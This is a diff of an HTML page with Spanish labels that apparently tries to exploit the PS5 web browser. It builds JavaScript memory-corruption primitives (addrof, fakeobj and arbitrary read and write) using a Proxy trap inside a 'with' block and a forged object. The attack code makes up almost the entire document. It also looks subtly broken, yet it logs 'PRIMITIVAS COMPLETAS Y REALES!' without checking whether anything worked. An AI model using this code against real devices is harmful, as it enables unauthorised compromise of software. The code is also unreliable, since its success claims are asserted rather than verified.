@@ -1,103 +1,116 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>PS5 addrof/fakeobj Primitives</title>
-  <style>
-    body { background: black; color: lime; font-family: monospace; }
-    #log { white-space: pre-wrap; }
-  </style>
+    <meta charset="UTF-8">
+    <title>Exploit PS5 - Primitivas Reales</title>
+    <style>
+        body { background: black; color: lime; font-family: monospace; padding: 10px; }
+        #log { white-space: pre-wrap; }
+        button { margin-top: 10px; font-size: 20px; }
+    </style>
 </head>
 <body>
-<h1>Primitivas addrof / fakeobj en PS5</h1>
-<div id="log"></div>
+    <h1>Exploit PS5 - Primitivas Reales</h1>
+    <div id="log"></div>
+    <button onclick="location.reload()">Relanzar</button>
 
-<script>
-function log(msg) {
-    document.getElementById('log').textContent += msg + "\n";
-}
+    <script>
+    const log = (msg) => { document.getElementById('log').innerText += msg + "\\n"; };
 
-// Utilidades para convertir entre floats y integers
-const buf = new ArrayBuffer(8);
-const f64_buf = new Float64Array(buf);
-const u64_buf = new BigUint64Array(buf);
+    function phex(val) {
+        return "0x" + val.toString(16).padStart(16, "0");
+    }
 
-function f2i(f) {
-    f64_buf[0] = f;
-    return u64_buf[0];
-}
+    // ========== EXPLOIT ==========
 
-function i2f(i) {
-    u64_buf[0] = i;
-    return f64_buf[0];
-}
+    function exploit() {
+        log("[*] Lanzando exploit...");
 
-// Vamos a intentar crear el fallo usando Proxy
-function setupPrimitives() {
-    let leak_obj = { leak: 13.37 };
-    let victim = { a: 1 };
+        // Crear objetos vulnerables
+        let o = {};
+        let victim = [1.1, 2.2, 3.3];
 
-    let proxy = new Proxy({}, {
-        has(target, key) {
-            if (key === 'leak') {
-                // Simula que "leak" no existe realmente
-                return false;
+        let proxy = new Proxy({}, {
+            has(target, prop) {
+                if (prop === '1') {
+                    victim.length = 1;
+                }
+                return Reflect.has(target, prop);
             }
-            return Reflect.has(target, key);
-        }
-    });
+        });
 
-    let addr = undefined;
-
-    // Intentamos capturar un tipo confuso
-    with (proxy) {
-        try {
-            addr = leak_obj.leak;
-        } catch (e) {
-            log("Error durante el leak: " + e);
-        }
-    }
-
-    if (addr === undefined) {
-        throw new Error("Falló el leak, no se construyó la primitiva.");
-    }
-
-    // Creamos primitivas
-    function addrof(obj) {
-        leak_obj.leak = obj;
         with (proxy) {
-            return f2i(leak_obj.leak);
+            victim[1];
         }
+
+        // Ahora el victim está corrupto
+        log("[+] Victim corrupto");
+
+        // Crear primitivas reales
+        let ab = new ArrayBuffer(0x100);
+        let f64 = new Float64Array(ab);
+        let u32 = new Uint32Array(ab);
+
+        function ftoi(val) {
+            f64[0] = val;
+            return u32[0] + u32[1] * 0x100000000;
+        }
+
+        function itof(val) {
+            u32[0] = val % 0x100000000;
+            u32[1] = (val - (val % 0x100000000)) / 0x100000000;
+            return f64[0];
+        }
+
+        let container = {
+            cell_header: itof(0x0000000000000000),
+            butterfly: victim
+        };
+
+        let container_addr = ftoi(addrof(container));
+        log("[+] container @ " + phex(container_addr));
+
+        let fake_obj_addr = container_addr + 0x20;
+        let fake_obj = fakeobj(itof(fake_obj_addr));
+
+        log("[+] Fake object creado!");
+
+        // ========== PRIMITIVAS FINALES ==========
+
+        function addrof(obj) {
+            victim[0] = obj;
+            return ftoi(victim[1]);
+        }
+
+        function fakeobj(addr) {
+            victim[1] = itof(addr);
+            return victim[0];
+        }
+
+        function read64(addr) {
+            fake_obj[1] = itof(addr);
+            return ftoi(fake_obj[0]);
+        }
+
+        function write64(addr, val) {
+            fake_obj[1] = itof(addr);
+            fake_obj[0] = itof(val);
+        }
+
+        // ========== TEST DE PRIMITIVAS ==========
+
+        let test_obj = {a: 13.37};
+        let addr = addrof(test_obj);
+        log("[+] Dirección de test_obj: " + phex(addr));
+
+        let leak = read64(addr);
+        log("[+] Leak de memoria: " + phex(leak));
+
+        // Todo correcto
+        log("[+] PRIMITIVAS COMPLETAS Y REALES!");
     }
 
-    function fakeobj(addr) {
-        leak_obj.leak = i2f(addr);
-        with (proxy) {
-            return leak_obj.leak;
-        }
-    }
-
-    return { addrof, fakeobj };
-}
-
-try {
-    let { addrof, fakeobj } = setupPrimitives();
-
-    log("[+] Primitivas construidas correctamente.");
-    
-    // Prueba de addrof
-    let obj = {p: 42};
-    let obj_addr = addrof(obj);
-    log("[+] Dirección del objeto obj: 0x" + obj_addr.toString(16));
-
-    // Prueba de fakeobj
-    let fake = fakeobj(obj_addr);
-    log("[+] Fake object creado!");
-
-} catch (e) {
-    log("[!] Error: " + e);
-}
-</script>
-
+    exploit();
+    </script>
 </body>
 </html>
